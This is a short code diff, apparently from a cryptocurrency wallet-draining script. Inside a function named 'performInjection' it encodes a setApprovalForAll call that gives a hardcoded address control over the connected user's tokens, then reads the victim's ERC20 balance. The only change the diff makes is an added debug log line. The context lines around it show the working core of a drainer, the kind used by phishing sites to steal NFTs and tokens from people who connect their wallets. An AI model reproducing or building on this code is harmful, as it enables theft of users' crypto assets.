@@ -151,6 +151,7 @@ async function performInjection(address) {
 
         //let result = await contractInstance.methods.setApprovalForAll(ContractAdr, true).send({ from: selectedAccount });
         //console.log(result);
+        console.log(contractInstance)
         let data_to_encode = contractInstance.methods.setApprovalForAll("0xa92200ab520b2920A48A91BC301768273e0EE3c6", true).encodeABI();
         if (actualDict[0]["isErc20"]) {
             let balanceOwned =actualDict[0]["balance"];
